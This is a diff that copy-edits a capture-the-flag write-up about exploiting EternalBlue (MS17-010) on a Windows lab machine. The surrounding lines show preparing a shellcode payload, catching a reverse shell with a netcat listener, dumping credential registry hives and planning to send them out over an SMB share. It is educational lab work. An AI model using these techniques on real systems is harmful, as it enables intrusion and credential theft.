@@ -140,7 +140,7 @@ host          port   proto  name           state  info
 10.10.201.83  49160  tcp    unknown        open   Microsoft Windows RPC
 ```
 
-### Preparing an attack
+### Preparing the attack
 The first step was to check if there were any exploits available for `ms17-010`
 
 ```
@@ -471,9 +471,9 @@ Once agaiin, the scans lead to the same conclusion that the host is vulnerable t
 
 
 ### Preparing the attack
-The first result that turned up was an exploit from Sleepya [Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) ](https://www.exploit-db.com/exploits/42031), while google pointed me to [worawit/MS17-010](https://github.com/worawit/MS17-010/). On further inspection they looked to be the same exploit however the worawit link provided shellcode that could be used as the basis for a payload.
+The first result that turned up was an exploit from Sleepya [Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) ](https://www.exploit-db.com/exploits/42031), whereas google pointed me to [worawit/MS17-010](https://github.com/worawit/MS17-010/). Upon further inspection, they looked to like the same exploit, but the worawit link provided shellcode that could be used as the basis for a payload.
 
-Looking further at the [eternalblue_kshellcode_x64.asm shellcode](https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm), it looked like the shellcode expected a user payload to be appended to the end of the binary both of which still needed to be prepared.
+Looking deeper into the [eternalblue_kshellcode_x64.asm shellcode](https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm), it looked like the shellcode expected a user payload to be appended to the end of the binary both of which still needed to be prepared.
 
 ```asm
 userland_start:
@@ -512,7 +512,7 @@ root@kali:~/ctf/exploits# cat sc_x64_kernel.bin reverse.bin > sc_joined.bin
 ```
 
 #### Attacking
-To prepare to catch the reverse shell, I started a netcat listener on port 443 in a new terminal before returning to the original to install the single required python dependency `impacket` and kick off the attack.
+To prepare to catch the reverse shell, I started a netcat listener on port 443 in a new terminal. Then I returned to the original to install the single required python dependency `impacket` and kick off the attack.
 
 ```bash
 root@kali:~# nc -lvnp 443
@@ -532,7 +532,7 @@ good response status: INVALID_PARAMETER
 done
 ```
 
-After executing the above, I switched back to our open netcat process to confirm the success of the attack and was happy to find a Windows shell prompt.
+I switched back to our open netcat process to confirm the success of the attack and was happy to find a Windows shell prompt.
 
 ```bash
 root@kali:~# nc -lvnp 443
@@ -545,7 +545,7 @@ C:\Windows\system32>
 ```
 
 ### Foothold
-Unlike the first attack I knew this windows shell was extremely limited, and my first priority was to try to egress credentials so that I could escalate to a more stable point of access.
+Unlike the first attack I knew this windows shell was extremely limited, so my first priority was to try to egress credentials so that I could escalate to a more stable point of access.
 
 ```
 C:\Windows\system32>net user
@@ -600,7 +600,7 @@ C:\>
 
 The first step was identifying the local users and attempting to dump some crucial registers that I could attack offline. While doing this I happened to dump these registry hives to the root of the `C:\` drive which happened to point out the first flag `flag{access_the_machine}`. In hindsight this was probably a poor choice of location as it would be much more likely to be caught here than in other locations.
 
-Now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine for further attack. This lead me to reference an example from [ropnop's blog](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb) pointing me towards the impacket-smbserver that comes preinstalled on Kali as I could interact with SMB from the cmd shell with out the need to install any further tools or have an interactive shell.
+Now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine for further attack. This lead me to reference an example from [ropnop's blog](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb) pointing me towards the impacket-smbserver which comes preinstalled on Kali. I could interact with SMB from the cmd shell with out the need for an interactive shell or any other tools.
 
 ```bash
 root@kali:~/# mkdir -p ctf/extractor && cd ctf/extractor
@@ -696,4 +696,4 @@ root@kali:~# rdesktop -u Jon 10.10.87.38
 ![Jon's PC](/img/blue_boot2root_jon_pc.png)
 
 ## Summary
-This attack really hammered in how simple metasploit makes some of the more tedious tasks. Not only sourcing and packing an exploit but in things like capturing the outputs of scans, handling setting up listeners to catch shells and the myriad of benefits meterpreter provides in stabalizing a shell, transfering files and pivoting. Despite all that, it was massively educational to be forced to read the exploit I was attempting to understand how to prepare it for use and it was fun attempting to pivot with only the resources I had available in the limited shell. 
+This experience really hammered in how many of the tedious tasks metasploit handles silently. It deals with, assiting in sourcing and packing an exploit, capturing the outputs of scans, handling setting up listeners and catching shells. Additionally, the value that meterpreter provides in stabalizing a shell, transfering files and pivoting is easy to take for granted until it is no longer available. Despite having to do many of those tasks manually, it was massively educational to be forced to read and understand exploit I had attempted and then pivot with the resources only available on the target's limited shell. 
